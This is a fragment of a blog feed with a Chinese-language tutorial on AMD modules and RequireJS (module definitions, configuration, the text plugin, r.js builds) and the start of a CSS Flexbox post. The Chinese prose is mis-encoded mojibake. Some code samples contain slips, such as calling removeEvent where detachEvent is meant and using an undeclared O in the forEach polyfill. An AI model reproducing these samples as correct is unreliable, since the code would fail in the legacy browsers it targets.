class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (el.addEventListener) &#123;</div><div class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.addEventListener(evt, fn, <span class="literal">false</span>);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el.attachEvent) &#123;</div><div class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.attachEvent(<span class="string">"on"</span> + evt, fn);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el[<span class="string">"on"</span> + evt] = fn;</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.addEvent(el, evt, fn);</div><div class="line">    &#125;,</div><div class="line">    removeEvent: <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (el.removeEventListener) &#123;</div><div class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.removeEventListener(evt, fn, <span class="literal">false</span>);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el.detachEvent) &#123;</div><div class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el.removeEvent(<span class="string">"on"</span> + evt, fn);</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</div><div class="line">                el[<span class="string">"on"</span> + evt] = fn;</div><div class="line">                <span class="keyword">return</span> el;</div><div class="line">            &#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.removeEvent(el, evt, fn);</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p><code>main.js</code> ä½¿ç”¨ <strong>RequireJS</strong> åŠ è½½æ¨¡å—ï¼Œæ¨¡å—ä¸éœ€è¦åç¼€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>([<span class="string">"dom/events"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line"></div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>åœ¨ <code>main.js</code> ä½¿ç”¨æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>([<span class="string">"dom/events"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">events</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">"target"</span>);</div><div class="line">    events.addEvent(elem, <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        alert(<span class="string">"clicked"</span>);</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p><code>index.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Learn Require.js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">"js/main"</span> <span class="attr">src</span>=<span class="string">"js/require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"target"</span>&gt;</span>Learning Require.js<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p>è®©æ¨¡å—ç¨å¾®å¤æ‚ç‚¹ <code>dom/events.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// we will add our sugar methods dynamically in here.</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> eventObject;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>å†å†™ä¸ª <em>Array.prototype.forEach</em> å…¼å®¹æ–¹æ³• <code>utils/array.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> nativeForEach = <span class="function"><span class="keyword">function</span> (<span class="params">list, callback, thisArg</span>) </span>&#123;</div><div class="line">        [].forEach.call(list, callback, thisArg);</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">var</span> customForEach = <span class="function"><span class="keyword">function</span> (<span class="params">list, callback, thisArg</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> T, k = <span class="number">0</span>, o, len, kValue;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">" this is null or not defined"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        O = <span class="built_in">Object</span>(list);</div><div class="line">        len = O.length &gt;&gt;&gt; <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (&#123;&#125;.toString.call(callback) != <span class="string">"[object Function]"</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(callback + <span class="string">" is not a function"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (thisArg) &#123;</div><div class="line">            T = thisArg;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">while</span>(k &lt; len) &#123;</div><div class="line">            <span class="keyword">if</span> (k <span class="keyword">in</span> O) &#123;</div><div class="line">                kValue = O[k];</div><div class="line">                callback.call(T, kValue, O);</div><div class="line">            &#125;</div><div class="line">            k++;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">        forEach: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (&#123;&#125;.toString.call([].forEach) === <span class="string">"[object Function]"</span>) &#123;</div><div class="line">                <span class="keyword">return</span> nativeForEach;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">return</span> customForEach;</div><div class="line">            &#125;</div><div class="line">        &#125;())</div><div class="line">    &#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>åŒæ ·ä½¿è¿™ä¸ªæ¨¡å—ç¨å¾®å¤æ‚ç‚¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">define([<span class="string">"utils/array"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// we will add our sugar methods dynamically in here.</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> eventObject;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>åœ¨ <code>dom/events.js</code> ä¸­ä½¿ç”¨ <code>utils/array.js</code>ï¼Œæ·»åŠ ä¾èµ–å…³ç³»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">define([<span class="string">"utils/array"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> eventObject = &#123; <span class="comment">/* the object we had previously */</span> &#125;;</div><div class="line"></div><div class="line">    array.forEach([<span class="string">"click"</span>, <span class="string">"mouseover"</span>,<span class="string">"mouseout"</span>, <span class="string">"keypress"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</div><div class="line">        eventObject[evt] = <span class="function"><span class="keyword">function</span> (<span class="params">el, fn</span>) </span>&#123;</div><div class="line">            <span class="keyword">this</span>.addEvent(el, evt, fn);</div><div class="line">        &#125;;</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> eventObject;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>åœ¨ <code>main.js</code> ä½¿ç”¨æ·»åŠ äº† <code>utils/array.js</code> ä¾èµ–çš„ <code>dom/events.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">event.click(elem, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="string">"clicked"</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>æ¨¡å—çš„åå­—ä¸æŒ‡å®šåˆ™ä¸ºæ¨¡å—é»˜è®¤å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">require([&quot;utils/array&quot;], function () &#123;</div><div class="line">    var arr = [1,2,3];</div><div class="line"></div><div class="line">    arrayUtils.forEach(arr, function (item) &#123;</div><div class="line">        // action here</div><div class="line">    &#125;);</div><div class="line">&#125;);</div><div class="line">```javascript</div><div class="line"></div><div class="line">é…ç½® **RequireJS**</div><div class="line"></div><div class="line">`index.html` åŠ è½½æ–‡ä»¶</div><div class="line"></div><div class="line">```html</div><div class="line">&lt;script src=&quot;js/require.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;script src=&quot;js/main.js&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure><p><code>main.js</code> å®Œæ•´é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">requirejs.config(&#123;</div><div class="line">    baseUrl: <span class="string">'./js'</span>,</div><div class="line">    paths: &#123;</div><div class="line">    jquery: <span class="string">'bower_components/jquery/dist/jquery.min'</span>,</div><div class="line">    underscore: <span class="string">'bower_components/underscore/underscore-min'</span>,</div><div class="line">    angular: <span class="string">'bower_components/angular/angular.min'</span>,</div><div class="line">    bootstrap: <span class="string">"bower_components/bootstrap/dist/js/bootstrap.min"</span>,</div><div class="line">    semantic: <span class="string">"bower_components/semantic-ui/dist/semantic.min"</span>,</div><div class="line">    C: <span class="string">'js/controllers'</span>,</div><div class="line">    S: <span class="string">'js/services'</span>,</div><div class="line">    F: <span class="string">'js/filters'</span>,</div><div class="line">    D: <span class="string">'js/directives'</span></div><div class="line">    &#125;,</div><div class="line">    shim: &#123;</div><div class="line">    jquery: &#123;</div><div class="line">        exports: <span class="string">'$'</span></div><div class="line">    &#125;,</div><div class="line">    underscore: &#123;</div><div class="line">        exports: <span class="string">'_'</span></div><div class="line">    &#125;,</div><div class="line">    angular: &#123;</div><div class="line">        deps: [<span class="string">'jquery'</span>]</div><div class="line">    &#125;,</div><div class="line">    bootstrap: &#123;</div><div class="line">        deps: [<span class="string">'jquery'</span>]</div><div class="line">    &#125;,</div><div class="line">    semantic: &#123;</div><div class="line">        deps: [<span class="string">'jquery'</span>]</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h3 id="RequireJS-æ’ä»¶"><a href="#RequireJS-æ’ä»¶" class="headerlink" title="RequireJS æ’ä»¶"></a><strong>RequireJS</strong> æ’ä»¶</h3><p>ä»¥ <a href="http://requirejs.org/docs/download.html#text" target="_blank" rel="external">text plugin</a> ä¸ºä¾‹</p><p>æŠŠ <a href="http://requirejs.org/docs/download.html#text" target="_blank" rel="external">text.js</a> æ”¾åœ¨ <code>main.js</code> åŒçº§ç›®å½•ï¼Œåœ¨ <code>main.js</code> è¯·æ±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">require</span>([<span class="string">"text!templates/list.html"</span>, <span class="string">"libs/underscore"</span>], <span class="function"><span class="keyword">function</span> (<span class="params">listTpl</span>) </span>&#123;</div><div class="line">    <span class="comment">// Underscore is loaded globally.</span></div><div class="line">    <span class="keyword">var</span> context = &#123;</div><div class="line">        people : &#123;</div><div class="line">            <span class="string">"Fredrick"</span> : <span class="string">"Back-end Developer"</span>,</div><div class="line">            <span class="string">"Victoria"</span> : <span class="string">"Front-end Developer"</span>,</div><div class="line">            <span class="string">"Hamilton"</span> : <span class="string">"Designer"</span>,</div><div class="line">            <span class="string">"Georgea"</span>  : <span class="string">"Content Strategist"</span></div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    <span class="built_in">document</span>.body.innerHTML =  _.template(listTpl)(context);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p><code>templates/list.html</code> æ¨¡æ¿ç”¨çš„æ˜¯ <strong>Rails</strong> <code>html</code> æ¨¡æ¿è¯­æ³•ï¼Œå› ä¸º <strong>underscorejs</strong> çš„ <a href="http://underscorejs.org/#template" target="_blank" rel="external">_.template()</a> é»˜è®¤è¿™ç§å†™æ³•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">%</span> <span class="attr">_.each</span>(<span class="attr">people</span>, <span class="attr">function</span> (<span class="attr">job</span>, <span class="attr">name</span>) &#123; %&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">name</span> %&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>: <span class="tag">&lt;<span class="name">%=</span> <span class="attr">job</span> %&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">%</span> &#125;); %&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div></pre></td></tr></table></figure><p><img src="https://cms-assets.tutsplus.com/legacy-premium-tutorials/posts/11931/images/11931_c64d1e1d443dbd47e7a52e54986d197c.png" alt=""></p><h3 id="ä¼˜åŒ–å·¥å…·"><a href="#ä¼˜åŒ–å·¥å…·" class="headerlink" title="ä¼˜åŒ–å·¥å…·"></a>ä¼˜åŒ–å·¥å…·</h3><p><code>app.build.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(&#123;</div><div class="line">    appDir: <span class="string">"../"</span>,</div><div class="line">    baseUrl: <span class="string">"js"</span>,</div><div class="line">    dir: <span class="string">"../../sample-build"</span>,</div><div class="line">    optimizeCSS: <span class="string">"standard"</span>,</div><div class="line">    paths : &#123;</div><div class="line">        <span class="string">"underscore"</span> : <span class="string">"libs/underscore-min"</span></div><div class="line">    &#125;,</div><div class="line">    modules: [ &#123; <span class="attr">name</span>: <span class="string">"main"</span> &#125; ]</div><div class="line">&#125;)</div></pre></td></tr></table></figure><p><code>r.js</code> é»˜è®¤ä¼˜åŒ–é…ç½®ï¼Œå¯ä»¥é€‰æ‹©æ€§æ”¹å˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">buildBaseConfig = &#123;</div><div class="line">    appDir: <span class="string">""</span>,</div><div class="line">    pragmas: &#123;&#125;,</div><div class="line">    paths: &#123;&#125;,</div><div class="line">    optimize: <span class="string">"uglify"</span>,</div><div class="line">    optimizeCss: <span class="string">"standard.keepLines"</span>,</div><div class="line">    inlineText: <span class="literal">true</span>,</div><div class="line">    isBuild: <span class="literal">true</span>,</div><div class="line">    optimizeAllPluginResources: <span class="literal">false</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>å¼€å§‹ build ä¼˜åŒ–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node /path/to/r.js -o app.build.js</div></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Optimizing (standard) CSS file: /Users/andrew/Sites/sample-build/css/custom.css</div><div class="line">Optimizing (standard) CSS file: /Users/andrew/Sites/sample-build/css/main.css</div><div class="line"></div><div class="line">Tracing dependencies <span class="keyword">for</span>: main</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/app.build.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/dom/events.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/libs/underscore-min.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/main.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/require.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/text.js</div><div class="line">Uglifying file: /Users/andrew/Sites/sample-build/js/utils/array.js</div><div class="line"></div><div class="line">js/main.js</div><div class="line">----------------</div><div class="line">js/utils/array.js</div><div class="line">js/dom/events.js</div><div class="line">js/text.js</div><div class="line">text!templates/list.html</div><div class="line">js/libs/underscore-min.js</div><div class="line">js/main.js</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æ‘˜å½•è‡ªï¼š&lt;a href=&quot;https://code.tutsplus.com/tutorials/next-generation-javascript-with-amd-and-requirejs--net-21596&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Next Generation JavaScript with AMD and RequireJS&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;ä¸ºäº†è§£å†³çš„é—®é¢˜&quot;&gt;&lt;a href=&quot;#ä¸ºäº†è§£å†³çš„é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;ä¸ºäº†è§£å†³çš„é—®é¢˜&quot;&gt;&lt;/a&gt;ä¸ºäº†è§£å†³çš„é—®é¢˜&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file1.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file2.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;file3.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="AMD" scheme="http://youngdze.co/tags/AMD/"/>
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>CSS Flexbox</title>
    <link href="http://youngdze.co/2015/08/27/css-flexbox/"/>
    <id>http://youngdze.co/2015/08/27/css-flexbox/</id>
    <published>2015-08-27T08:36:20.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ‰ä¸€ä¸ªå®¹å™¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><p>è®¾ç½®å®¹å™¨å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.container</span> &#123;</div><div class="line">    <span class="attribute">display</span>: flex;</div><div class="line">    <span class="comment">/* å†…éƒ¨é¡¹ç›®æ’åˆ—æ–¹å‘ */</span></div><div class="line">    <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</div><div class="line">    <span class="comment">/* æ˜¯å¦æ¢è¡Œå’Œæ¢è¡Œååè¿‡æ¥ */</span></div><div class="line">    <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</div><div class="line">    <span class="comment">/* é€Ÿå†™æ³• */</span></div><div class="line">    flex-flow: &lt;&amp;#39;flex-direction&amp;#39;&gt; || &lt;&amp;#39;flex-wrap&amp;#39;&gt;;</div><div class="line">    <span class="comment">/* æ•´ç†ç‰ˆé¢ */</span></div><div class="line">    justify-content: flex-start | flex-end | center | space-between | space-around;</div><div class="line">    <span class="comment">/* æ’åˆ—å†…éƒ¨é¡¹ç›® */</span></div><div class="line">    align-items: flex-start | flex-end | center | stretch | baseline;</div><div class="line">    <span class="comment">/* æ’åˆ—å†…å®¹ */</span></div><div class="line">    align-content: flex-start | flex-end | center | stretch | space-between | space-around;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>è®¾ç½®å†…éƒ¨é¡¹ç›®å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.item</span> &#123;</div><div class="line">    <span class="comment">/* æ’åˆ—é¡ºåº */</span></div><div class="line">    <span class="attribute">order</span>: &lt;integer&gt;;</div><div class="line">    <span class="comment">/* æ˜¯å¦æ‹‰é•¿ */</span></div><div class="line">    <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 means no flex grow */</span></div><div class="line">    <span class="comment">/* æ˜¯å¦æ”¶ç¼© */</span></div><div class="line">    <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 0 means no flex shrink*/</span></div><div class="line">    <span class="comment">/* é¡¹ç›®é•¿åº¦ */</span></div><div class="line">  